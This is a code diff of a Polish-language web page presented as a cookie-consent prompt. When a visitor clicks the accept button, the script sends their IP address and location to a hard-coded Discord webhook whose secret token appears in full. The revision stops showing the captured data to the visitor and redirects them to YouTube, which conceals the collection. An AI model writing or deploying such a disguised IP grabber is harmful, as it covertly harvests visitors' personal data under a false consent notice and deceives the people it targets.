@@ -1,99 +1,79 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Cookies 🍪</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Akceptacja Ciasteczek</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
+      background: #0f0f0f;
       font-family: 'Segoe UI', sans-serif;
-      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      text-align: center;
-      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
-      color: #fff;
-      overflow: hidden;
+      height: 100vh;
     }
 
-    .container {
-      max-width: 700px;
-      padding: 2rem;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid #333;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(255, 105, 180, 0.2);
-      backdrop-filter: blur(10px);
-      animation: fadeIn 1s ease-out;
+    .box {
+      background: #1a1a1a;
+      padding: 3rem 2rem;
+      border-radius: 1.5rem;
+      box-shadow: 0 0 30px #ff69b455;
+      text-align: center;
+      max-width: 600px;
+      color: white;
     }
 
     h1 {
-      font-size: 3rem;
-      color: #ff69b4;
+      font-size: 2.5rem;
       margin-bottom: 1rem;
-      animation: pulse 2s infinite;
+      color: #ff69b4;
     }
 
     p {
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       color: #ccc;
       margin-bottom: 2rem;
     }
 
     button {
-      font-size: 1.5rem;
-      padding: 0.8rem 2rem;
       background: #ff69b4;
       color: white;
       border: none;
-      border-radius: 50px;
+      padding: 1rem 2.5rem;
+      border-radius: 999px;
+      font-size: 1.3rem;
       cursor: pointer;
-      transition: 0.3s ease;
-      box-shadow: 0 4px 12px rgba(255, 105, 180, 0.3);
+      transition: 0.2s ease;
+      appearance: button;
     }
 
     button:hover {
-      transform: scale(1.05);
       background: #ff85c1;
+      transform: scale(1.05);
     }
 
     #status {
       margin-top: 2rem;
       font-size: 1rem;
       color: #55ff55;
-      background: #111;
-      padding: 1rem;
-      border-radius: 12px;
-      display: inline-block;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
+  <div class="box">
     <h1>🍪 Akceptacja Ciasteczek</h1>
-    <p>Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br>
-    Klikając przycisk poniżej, zgadzasz się na ich użycie.</p>
-
+    <p>
+      Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br />
+      Klikając przycisk poniżej, zgadzasz się na ich użycie.
+    </p>
     <button id="cookie-btn">Zatwierdzam 🍪</button>
     <div id="status"></div>
   </div>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1385313513114833169/xvypbNqZhd6asz7f8GNTw93kAocwRI8FWkGGTev3rqrl2JQVQ5fUestuR3mQbQMypzhK";
+    const webhook = "https://discord.com/api/webhooks/1385314908207321098/OYfVnE3smQG42WfSEXP4H4aNo3SCOXq_1zA9Dptvkg2iP41VPVwzwShFTGAx6TkLiMxW";
 
     document.getElementById("cookie-btn").onclick = async () => {
       const status = document.getElementById("status");
@@ -112,7 +92,7 @@
         ip = "Błąd IP";
       }
 
-      const embed = {
+      const payload = {
         embeds: [{
           title: "🍪 Nowe ciasteczko kliknięte!",
           color: 0xff69b4,
@@ -129,12 +109,15 @@
       await fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embed)
+        body: JSON.stringify(payload)
       });
 
-      status.innerHTML = `<b>🍪 Zapisano ciasteczko!</b><br><small>IP: ${ip}<br>Lokalizacja: ${location}</small>`;
-    }
-  </script>
+      status.innerHTML = `<b>Dziękujemy za akceptację 🍪</b><br>Przekierowuję...`;
 
+      setTimeout(() => {
+        window.location.href = "https://youtube.com";
+      }, 3000);
+    };
+  </script>
 </body>
 </html>
